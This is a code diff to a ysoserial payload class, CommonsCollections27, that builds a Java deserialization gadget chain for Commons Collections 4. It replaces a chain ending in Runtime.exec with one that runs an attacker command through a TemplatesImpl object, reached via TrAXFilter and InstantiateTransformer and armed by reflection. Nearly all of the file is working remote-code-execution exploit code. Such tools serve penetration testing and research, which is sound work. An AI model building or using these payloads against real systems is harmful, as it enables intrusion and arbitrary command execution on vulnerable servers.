@@ -1,19 +1,19 @@
 package ysoserial.payloads;
 
-import org.apache.commons.collections.Transformer;
-import org.apache.commons.collections.functors.ChainedTransformer;
-import org.apache.commons.collections.functors.ConstantTransformer;
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections4.map.*;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
 import org.apache.commons.collections4.keyvalue.TiedMapEntry;
 import org.apache.commons.collections4.map.DefaultedMap;
+import org.apache.commons.collections4.map.Flat3Map;
+import org.apache.commons.collections4.map.ReferenceMap;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
+import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
-import java.util.EnumMap;
-import java.util.HashMap;
+import javax.xml.transform.Templates;
 import java.util.Map;
 import java.util.concurrent.ConcurrentHashMap;
 
@@ -41,77 +41,57 @@ import java.util.concurrent.ConcurrentHashMap;
 @Dependencies({"commons-collections:commons-collections4:4.0"})
 @Authors({ Authors.NAVALORENZO })
 public class CommonsCollections27 extends PayloadRunner implements ObjectPayload<ReferenceMap> {
-    enum ProvaEnum {
-        zZ,
-        yy
-    }
 
     public ReferenceMap getObject(final String command) throws Exception {
 
-        // Reusing transformer chain and LazyMap gadgets from previous payloads
-        final String[] execArgs = new String[]{command};
+        Object templates = Gadgets.createTemplatesImpl(command);
 
-        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
+        org.apache.commons.collections4.functors.ConstantTransformer constant = new org.apache.commons.collections4.functors.ConstantTransformer(String.class);
 
-        final Transformer[] transformers = new Transformer[]{
-            new ConstantTransformer(Runtime.class),
-            new org.apache.commons.collections.functors.InvokerTransformer("getMethod",
-                new Class[]{String.class, Class[].class},
-                new Object[]{"getRuntime", new Class[0]}),
-            new org.apache.commons.collections.functors.InvokerTransformer("invoke",
-                new Class[]{Object.class, Object[].class},
-                new Object[]{null, new Object[0]}),
-            new InvokerTransformer("exec",
-                new Class[]{String.class},
-                execArgs),
-            new ConstantTransformer(1)};
+        // mock method name until armed
+        Class[] paramTypes = new Class[] { String.class };
+        Object[] args = new Object[] { "foo" };
+        InstantiateTransformer instantiate = new InstantiateTransformer(
+            paramTypes, args);
 
+        // grab defensively copied arrays
+        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
+        args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
 
-        Map innerMap1 = new HashMap();
-        Map innerMap2 = new HashMap();
+        ChainedTransformer chain = new ChainedTransformer(new org.apache.commons.collections4.Transformer[] { constant, instantiate });
 
-        // Creating two DefaultedMap with colliding hashes, in order to force element comparison during readObject
-        Map defaultedMap1 = DefaultedMap.defaultedMap(innerMap1, (Object) transformerChain);
-        defaultedMap1.put("yy", 1);
-
-        Map defaultedMap2 = DefaultedMap.defaultedMap(innerMap2, (Object) transformerChain);
-        defaultedMap2.put("zZ", 1);
-
-        ConcurrentHashMap concurrentHashMap1 = new ConcurrentHashMap();
-        concurrentHashMap1.put(defaultedMap1, 1);
-        ConcurrentHashMap concurrentHashMap2 = new ConcurrentHashMap();
-        concurrentHashMap2.put(defaultedMap2, 1);
-        TiedMapEntry tiedMapEntry1 = new TiedMapEntry(concurrentHashMap1, concurrentHashMap1);
-        TiedMapEntry tiedMapEntry2 = new TiedMapEntry(concurrentHashMap2, concurrentHashMap2);
-
-
-        Flat3Map flat3map1 = new org.apache.commons.collections4.map.Flat3Map();
-        //flat3map1.put(lazyMap1, 1);
-        flat3map1.put("yy", tiedMapEntry1);
-        //flat3map1.put(flat3map1, 1);
-
-        Flat3Map flat3map2 = new org.apache.commons.collections4.map.Flat3Map();
-        //flat3map2.put(lazyMap2, 1);
-        flat3map2.put("yy", tiedMapEntry2);
-        //flat3map2.put(flat3map2, 2);
-
-
-        /*EnumMap enumMap2 = new EnumMap(lazyMap1);
-        TiedMapEntry tiedMapEntry2 = new TiedMapEntry(enumMap2, new Object());*/
-
-        // Use the colliding Maps as keys in ReferenceMap
         ReferenceMap referenceMap = new ReferenceMap();
-        referenceMap.put(flat3map1, 1);
-        referenceMap.put(flat3map2, 2);
-        /*LRUMap outputLRUMap = new LRUMap();
-        outputLRUMap.put(lazyMap1, 1);
-        outputLRUMap.put(lazyMap2, 2);*/
 
-        // arm transformer
-        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
+        ConcurrentHashMap concurrentHashMap = new ConcurrentHashMap();
+        concurrentHashMap.put("yy", 1);
+        TiedMapEntry tiedMapEntry1 = new TiedMapEntry(concurrentHashMap, concurrentHashMap);
+        Flat3Map flat3Map1 = new Flat3Map();
+        flat3Map1.put(tiedMapEntry1, 1);
 
-        // Needed to ensure hash collision after previous manipulations
-        defaultedMap2.remove("yy");
+        ConcurrentHashMap wrapped = new ConcurrentHashMap();
+        wrapped.put("zZ", 1);
+        /*ConstantTransformer constantTransformer2 = new ConstantTransformer(wrapped);
+        Flat3Map flat3Map2 = new Flat3Map();
+        flat3Map2.put(constantTransformer2, 1);*/
+        DefaultedMap<String,Integer> defaultedMap = (DefaultedMap) DefaultedMap.<Map, org.apache.commons.collections4.Transformer>defaultedMap(wrapped, (org.apache.commons.collections4.Transformer<Integer,String>)chain);
+        TiedMapEntry tiedMapEntry2 = new TiedMapEntry(defaultedMap, defaultedMap);
+        Flat3Map flat3Map2 = new Flat3Map();
+        // comunque non passa per il constantTransformer.equals
+        //flat3Map2.put(constantTransformer2, 1);
+        flat3Map2.put(tiedMapEntry2, 1);
+        DefaultedMap<String,Integer> defaultedMap2 = (DefaultedMap) DefaultedMap.<Map, org.apache.commons.collections4.Transformer>defaultedMap(flat3Map2, (org.apache.commons.collections4.Transformer<Integer,String>)chain);
+
+
+        referenceMap.put(flat3Map1, "b");
+        referenceMap.put(flat3Map2, "a");
+
+        // swap in values to arm
+        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
+        paramTypes[0] = Templates.class;
+        args[0] = templates;
+
+        Reflections.setFieldValue(defaultedMap, "value", chain);
+
 
         return referenceMap;
     }
